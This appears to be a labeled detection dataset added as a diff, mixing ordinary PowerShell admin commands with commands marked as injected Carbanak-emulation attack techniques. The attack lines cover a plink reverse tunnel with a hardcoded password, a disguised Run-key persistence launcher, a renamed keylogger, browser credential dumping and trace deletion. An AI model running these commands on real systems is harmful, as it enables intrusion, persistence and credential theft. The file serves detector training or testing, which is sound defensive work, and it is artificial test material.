@@ -1,0 +1,44 @@
+Get-ADComputer -Identity 'cfo' -Properties *     // GROUND-TRUTH : T1018: Remote System Discovery (discovery) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Copy-Item C:\Windows\System32\*.* C:\Backup -Recurse -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Path -Path 'C:\Windows\System32\drivers\etc\hosts'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item plink.exe C:\\Windows\\Temp\\plink.exe;
+echo n | C:\\Windows\\Temp\\plink.exe -pw "azsxdcAZSXDC123" alfred@192.168.0.4 -R 3389:localhost:3389   // GROUND-TRUTH : T1572: Protocol Tunneling (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Copy-Item C:\Windows\System32\drivers\*.sys C:\Backup -Recurse     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ChildItem C:\ -Recurse | Out-File C:\ScriptLog.txt     // LABEL: BENIGN-POWERSHELL-COMMAND
+qwinsta /server:cfo     // GROUND-TRUTH : T1033: System Owner/User Discovery (discovery) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Set-ExecutionPolicy Bypass -Scope Process -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item C:\Logs\*.log C:\Backup\Logs -Recurse -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+New-Item C:\temp\script.ps1 -Type File -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -ErrorAction SilentlyContinue | ForEach-Object { if ($_.DisableTaskMgr -eq 1) { Write-Output 'Task Manager can be disabled.' } else { Write-Output 'Task Manager cannot be disabled.' } }     // LABEL: BENIGN-POWERSHELL-COMMAND
+Invoke-Sqlcmd -Query 'SELECT * FROM Users' -Database 'MyDB' -ServerInstance 'localhost'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item Java-Update.exe C:\Users\Public\Java-Updater.exe;
+echo Set oShell = CreateObject ("Wscript.Shell") > C:\Users\Public\Java-Update.vbs;
+echo Dim strArgs >> C:\Users\Public\Java-Update.vbs;
+echo strArgs = "C:\Users\Public\Java-Updater.exe" >> C:\Users\Public\Java-Update.vbs;
+echo oShell.Run strArgs, 0, false >> C:\Users\Public\Java-Update.vbs     // GROUND-TRUTH : T1105: Ingress Tool Transfer (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Test-Path C:\Logs\ -PathType Container     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Service | Where-Object {$_.Status -eq 'Stopped'} | ForEach-Object {$_.Start-Service}     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Path -Path 'C:\Windows\System32\System32\WindowsPowerShell\v1.0\Modules\' -PathType Container     // LABEL: BENIGN-POWERSHELL-COMMAND
+cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update /t REG_SZ /d C:\Users\Public\Java-Update.vbs     // GROUND-TRUTH : T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (persistence) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Get-Service | Where-Object {$_.Status -eq 'Running'} | Set-Service -StartupType Disabled     // LABEL: BENIGN-POWERSHELL-COMMAND
+$password = ConvertTo-SecureString 'Password123' -AsPlainText -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ADComputer -Filter {Name -like 'Server*'} -Properties OperatingSystem -ExpandProperty OperatingSystem | Out-File 'C:\ComputerDetails.txt'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item keylogger.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\DefenderUpgradeExec.exe;
+C:\\Users\\jsmith\\AppData\\Local\\Temp\\DefenderUpgradeExec.exe  // GROUND-TRUTH : T1056.001: Input Capture: Keylogging (collection) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Get-WmiObject Win32_OperatingSystem | Select-Object -Property Caption, CSName, InstallDate | Out-File C:\Win32OS.csv     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item -Path 'C:\Source\*' -Destination 'C:\Destination\' -Recurse -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+$env:TEMP=\C:\Temp\Workspace\""     // LABEL: BENIGN-POWERSHELL-COMMAND
+type C:\\Users\\jsmith\\AppData\\Local\\Temp\\klog2.txt    // GROUND-TRUTH : T1056.001: Input Capture: Keylogging (collection) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Move-Item dumpWebCreds.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\infosMin48.exe;
+C:\\Users\\jsmith\\AppData\\Local\\Temp\\infosMin48.exe -i -H   // GROUND-TRUTH : T1555.003: Credentials from Password Stores: Credentials from Web Browsers (collection) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Get-EventLog -LogName System | Where-Object {$_.EntryType -eq 'Warning' -and $_.Message -like 'Disk C:*' -and $_.TimeGenerated -gt (Get-Date).AddDays(-7)} | Select-Object -First 15     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-EventLog -LogName Application | Where-Object {$_.EntryType -eq 'Error' -and $_.Source -eq 'System' -and $_.Message -like '*File Not Found*'} | Select-Object -First 10     // LABEL: BENIGN-POWERSHELL-COMMAND
+Stop-Process -Name DefenderUpgradeExec;
+Remove-Item $env:TEMP\* -Recurse -Force -Erroraction 'silentlycontinue'     // GROUND-TRUTH : T1070.004: Indicator Removal on Host: File Deletion (defense-evasion) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Remove-Item -Path C:\Windows\Temp -Recurse -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+$password = ConvertTo-SecureString 'Password123' -AsPlainText -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Mailbox -Identity user@example.com -Database mailbox_database -PrimarySmtpAddress user@example.com     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Service -Name 'wuauserv' -ComputerName localhost -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq 'notepad.exe'} | Format-Table Name, Path -AutoSize     // LABEL: BENIGN-POWERSHELL-COMMAND
+Start-Transcript -Path 'C:\Logs\Session.txt' -Append     // LABEL: BENIGN-POWERSHELL-COMMAND
+Start-Process cmd -ArgumentList '/c echo This is a simple command'     // LABEL: BENIGN-POWERSHELL-COMMAND
